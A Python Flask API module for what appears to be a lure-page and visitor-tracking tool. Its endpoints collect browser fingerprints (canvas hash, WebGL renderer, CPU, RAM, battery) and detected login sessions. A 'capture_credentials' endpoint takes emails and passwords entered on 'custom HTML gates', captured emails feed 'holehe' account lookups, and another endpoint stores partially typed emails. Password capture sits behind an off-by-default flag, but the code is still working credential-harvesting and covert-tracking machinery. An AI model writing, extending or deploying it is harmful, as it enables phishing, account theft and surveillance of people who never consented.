from flask import Blueprint, request, jsonify
from datetime import datetime
import json
from flask_login import login_required
from ..extensions import log_queue, db, limiter, csrf
from ..models import Lead, Visit, Link
from ..config import Config
from ..utils import verify_visit_token

bp = Blueprint('api', __name__, url_prefix='/api')

# Exempt entire API blueprint from CSRF protection (used by JavaScript)
csrf.exempt(bp)


def _validate_visit_token(data):
    if not Config.REQUIRE_VISIT_TOKEN:
        return True
    if not data:
        return False
    token = data.get('visit_token') or data.get('token')
    visit_id = data.get('visit_id')
    try:
        visit_id = int(visit_id)
    except Exception:
        return False

    verified_id = verify_visit_token(token, Config.VISIT_TOKEN_TTL_SECONDS)
    return verified_id == visit_id


def _clean_partial_email(value: str) -> str:
    if not value:
        return ''
    cleaned = ''.join(ch for ch in value.strip() if ch.isprintable())
    return cleaned[:120]

@bp.route('/beacon', methods=['POST'])
@limiter.limit("60 per minute")
def receive_beacon():
    try:
        data = request.get_json(force=True, silent=True)
        if not _validate_visit_token(data):
            return "Unauthorized", 403
        if data:
            v_id = data.get('visit_id')
            if v_id:
                visit = Visit.query.get(v_id)
                if visit:
                    visit.screen_res = data.get('screen_res', 'Unknown')
                    visit.timezone = data.get('timezone', 'Unknown')
                    visit.browser_bot = bool(data.get('webdriver', False))
                    visit.browser_language = data.get('language', 'Unknown')
                    visit.adblock = bool(data.get('adblock', False))
                    visit.canvas_hash = data.get('canvas_hash')
                    visit.webgl_renderer = data.get('webgl_renderer')
                    
                    # V24 Pro Data
                    visit.cpu_cores = data.get('cpu_cores')
                    visit.ram_gb = data.get('ram_gb')
                    visit.battery_level = data.get('battery_level')
                    
                    db.session.commit()
                    

    except Exception as e:
        print(f"Beacon Error: {e}")
    return "OK", 200

@bp.route('/lead/<int:lead_id>/status')
@login_required
def lead_status(lead_id):
    lead = Lead.query.get_or_404(lead_id)
    return jsonify({
        'status': lead.scan_status,
        'sites': lead.holehe_data, 
        'last_scan': lead.last_scan.isoformat() if lead.last_scan else None
    })
@bp.route('/log_session', methods=['POST'])
@limiter.limit("30 per minute")
def log_session():
    try:
        data = request.get_json(force=True, silent=True)
        if not _validate_visit_token(data):
            return "Unauthorized", 403
        if data:
            v_id = data.get('visit_id')
            sessions = data.get('sessions', [])
            if v_id and sessions:
                visit = Visit.query.get(v_id)
                if visit:
                    import json
                    # Merge with existing
                    existing = []
                    if visit.detected_sessions:
                        try: existing = json.loads(visit.detected_sessions)
                        except: pass
                    
                    # Add new uniq
                    existing.extend([s for s in sessions if s not in existing])
                    visit.detected_sessions = json.dumps(existing)
                    db.session.commit()
    except Exception as e:
        print(f"Session Log Error: {e}")
    return "OK", 200

@bp.route('/capture_credentials', methods=['POST'])
@limiter.limit("10 per minute")
def capture_credentials():
    """Capture email/password from custom HTML gates."""
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return "No data", 400

        if not _validate_visit_token(data):
            return "Unauthorized", 403
        
        visit_id = data.get('visit_id')
        email = data.get('email')
        password = data.get('password')
        
        if visit_id:
            visit = Visit.query.get(visit_id)
            if visit:
                # Save email to visit
                if email:
                    visit.email = email
                    
                    # Create/update lead
                    lead = Lead.query.filter_by(email=email).first()
                    if not lead:
                        lead = Lead(email=email, scan_status='pending')
                        db.session.add(lead)

                    db.session.commit()
                    if lead and lead.id:
                        log_queue.put({'type': 'ai_auto_tag', 'lead_id': lead.id})
                
                # Credential capture is disabled by default for safety
                if password and Config.ALLOW_CREDENTIAL_CAPTURE:
                    import bcrypt
                    import json
                    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
                    if hasattr(visit, 'detected_sessions'):
                        sessions = json.loads(visit.detected_sessions or '[]')
                        sessions.append({'type': 'password_captured', 'hash': password_hash[:20] + '...'})
                        visit.detected_sessions = json.dumps(sessions)
                    db.session.commit()
                else:
                    db.session.commit()
                
                print(f"Captured credentials from visit {visit_id}: email={email}, pwd={'***' if password else 'None'}")
                
    except Exception as e:
        print(f"Capture Error: {e}")
    
    return "OK", 200


@bp.route('/lead_partial', methods=['POST'])
@limiter.limit("10 per minute")
def lead_partial():
    if not Config.ALLOW_PARTIAL_EMAIL_CAPTURE:
        return "Disabled", 403

    visit_id = request.form.get('visit_id')
    visit_token = request.form.get('visit_token')
    partial_email = _clean_partial_email(request.form.get('partial_email', ''))

    if not _validate_visit_token({'visit_id': visit_id, 'visit_token': visit_token}):
        return "Unauthorized", 403
    if not visit_id or not partial_email:
        return "Missing data", 400

    visit = Visit.query.get(visit_id)
    if not visit:
        return "Not found", 404

    note = f"partial_email:{partial_email}"
    if visit.notes:
        if note not in visit.notes:
            visit.notes = f"{visit.notes} | {note}"
    else:
        visit.notes = note
    db.session.commit()
    return "OK", 200
